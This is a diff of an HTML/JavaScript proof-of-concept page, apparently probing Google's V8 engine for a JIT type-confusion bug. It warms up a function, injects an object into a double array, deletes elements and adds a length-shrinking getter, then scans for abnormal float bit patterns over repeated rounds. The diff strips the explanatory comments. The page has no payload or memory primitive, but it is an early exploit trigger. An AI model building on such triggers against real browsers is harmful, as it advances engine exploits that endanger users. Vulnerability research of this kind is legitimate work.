@@ -1,8 +1,7 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Signal PoC - Strong Deterministic</title>
+<title>V8 Validation PoC</title>
 
-<h3>V8 Signal Test (No Exploit)</h3>
 <pre id="log"></pre>
 
 <script>
@@ -11,50 +10,37 @@ const log = m => {
   console.log(m);
 };
 
-// convert float → bits
 function f2i(f) {
   const buf = new ArrayBuffer(8);
   new Float64Array(buf)[0] = f;
   return new BigUint64Array(buf)[0];
 }
 
-// target function
 function vuln(a, i) {
   return a[i] + 1.1;
 }
 
-// warmup JIT
 function warmup() {
   let arr = new Array(64);
   for (let i = 0; i < 64; i++) arr[i] = i + 0.5;
 
-  for (let i = 0; i < 150000; i++) {
+  for (let i = 0; i < 200000; i++) {
     vuln(arr, i & 63);
   }
   return arr;
 }
 
-// stronger deterministic confusion attempt
 function trigger(arr) {
-
-  // keep double elements first
   for (let i = 0; i < 32; i++) arr[i] = i + 0.5;
 
-  // stabilize inline cache
-  for (let i = 0; i < 20000; i++) vuln(arr, i & 31);
+  for (let i = 0; i < 30000; i++) vuln(arr, i & 31);
 
-  // introduce type change AFTER optimization
-  arr[1] = {};     // object into double array
-  arr[2] = 13.37;
-
-  // hole creation
+  arr[1] = {};
   delete arr[5];
-  delete arr[6];
 
-  // side-effect getter (critical)
   Object.defineProperty(arr, 4, {
     get() {
-      arr.length = 1;   // shrink mid-access
+      arr.length = 1;
       return 1.1;
     }
   });
@@ -62,8 +48,10 @@ function trigger(arr) {
   return arr;
 }
 
-// check anomalies
-function check(arr) {
+// 🔥 validation logic
+function validate(arr) {
+  let suspicious = [];
+
   for (let i = 0; i < 10; i++) {
     let v = arr[i];
 
@@ -71,38 +59,39 @@ function check(arr) {
       let bits = f2i(v);
       let hex = bits.toString(16);
 
-      // detect weird float patterns
+      // check abnormal
       if (hex.startsWith("7ff") && !Number.isNaN(v)) {
-        log(`[!!!] INVALID FLOAT @${i} = ${v} bits=0x${hex}`);
-      } else {
-        log(`[OK] number @${i} = ${v}`);
+        suspicious.push({i, v, hex});
+        log(`[SUS] idx=${i} val=${v} bits=0x${hex}`);
       }
-
-    } else {
-      log(`[INFO] type=${typeof v} @${i}`);
     }
   }
+
+  return suspicious;
 }
 
-// main
-function run() {
-  log("[*] warmup");
-  let base = warmup();
+// 🔁 run multiple times (IMPORTANT)
+function runTest() {
+  let hits = 0;
 
-  log("[*] trigger");
-  let arr = base.slice();
-  trigger(arr);
+  for (let round = 0; round < 20; round++) {
+    let base = warmup();
+    let arr = base.slice();
+    trigger(arr);
 
-  log("[*] invoke optimized path");
-  for (let i = 0; i < 50; i++) {
-    vuln(arr, i & 7);
+    for (let i = 0; i < 50; i++) vuln(arr, i & 7);
+
+    let res = validate(arr);
+
+    if (res.length > 0) {
+      hits++;
+      log(`[ROUND ${round}] suspicious detected (${res.length})`);
+    }
   }
 
-  log("[*] checking...");
-  check(arr);
-
-  log("[*] done");
+  log(`\n=== RESULT ===`);
+  log(`suspicious rounds: ${hits}/20`);
 }
 
-run();
+runTest();
 </script>
